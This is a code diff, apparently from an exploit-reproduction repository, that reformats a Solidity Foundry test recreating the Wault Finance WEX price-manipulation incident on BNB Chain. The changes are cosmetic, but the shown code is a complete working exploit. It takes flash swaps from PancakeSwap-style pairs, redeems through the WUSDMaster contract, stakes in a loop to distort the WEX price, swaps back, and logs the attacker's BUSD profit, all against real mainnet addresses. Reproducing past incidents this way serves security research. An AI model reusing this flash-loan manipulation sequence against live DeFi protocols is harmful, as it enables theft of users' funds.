@@ -9,13 +9,13 @@ import "./interface.sol";
 // https://inspexco.medium.com/wault-finance-incident-analysis-wex-price-manipulation-using-wusdmaster-contract-c344be3ed376
 // tx
 // https://bscscan.com/tx/0x31262f15a5b82999bf8d9d0f7e58dcb1656108e6031a2797b612216a95e1670e
-interface WUSDMASTER{
+interface WUSDMASTER {
     function stake(uint256) external;
     function redeem(uint256) external;
     function maxStakeAmount() external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IERC20 WUSD = IERC20(0x3fF997eAeA488A082fb7Efc8e6B9951990D0c3aB);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -24,91 +24,75 @@ contract ContractTest is DSTest{
     Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB USDT
     Uni_Router_V2 Router = Uni_Router_V2(0xD48745E39BbED146eEC15b79cBF964884F9877c2); // WS router
     WUSDMASTER Master = WUSDMASTER(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);
-    uint Pair1Amount;
+    uint256 Pair1Amount;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 9728755);
+        cheats.createSelectFork("bsc", 9_728_755);
     }
 
-    function testExploit() public{
+    function testExploit() public {
         // borrow WUSD
         Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;
         Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));
 
         // WUSD to BUSD
-        WUSD.approve(address(Router), type(uint).max);
+        WUSD.approve(address(Router), type(uint256).max);
         WUSDToBUSD();
 
-        emit log_named_decimal_uint(
-            "Attacker BUSD profit after exploit",
-            BUSD.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Attacker BUSD profit after exploit", BUSD.balanceOf(address(this)), 18);
     }
 
     function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
-        WUSD.approve(address(Master), type(uint).max);
+        WUSD.approve(address(Master), type(uint256).max);
         // WUSD to USDT, WEX
         Master.redeem(WUSD.balanceOf(address(this)));
         Pair2.swap(40_000_000 * 1e18, 0, address(this), new bytes(1));
-        WUSD.transfer(address(Pair1), Pair1Amount * 10000 / 9975 + 1000);
+        WUSD.transfer(address(Pair1), Pair1Amount * 10_000 / 9975 + 1000);
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
-        USDT.approve(address(Master), type(uint).max);
-        USDT.approve(address(Router), type(uint).max);
+        USDT.approve(address(Master), type(uint256).max);
+        USDT.approve(address(Router), type(uint256).max);
         // USDT to WEX
         USDTToWEX();
         // stake to change Pair
-        uint stakeAmout = 250_000 * 1e18;
+        uint256 stakeAmout = 250_000 * 1e18;
         // Master.maxmaxStakeAmount();
-        for(uint i = 0; i < 68; i++){
+        for (uint256 i = 0; i < 68; i++) {
             Master.stake(stakeAmout);
         }
         // WEX to USDT
-        WEX.approve(address(Router), type(uint).max);
+        WEX.approve(address(Router), type(uint256).max);
         WEXToUSDT();
         USDT.transfer(address(Pair2), 40_121_000 * 1e18);
     }
 
     function USDTToWEX() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(USDT);
         path[1] = address(WEX);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            23_000_000 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            23_000_000 * 1e18, 0, path, address(this), block.timestamp
         );
     }
 
     function WEXToUSDT() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(WEX);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WEX.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WEX.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
     function WUSDToBUSD() internal {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(WUSD);
         path[1] = address(BUSD);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WUSD.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 }
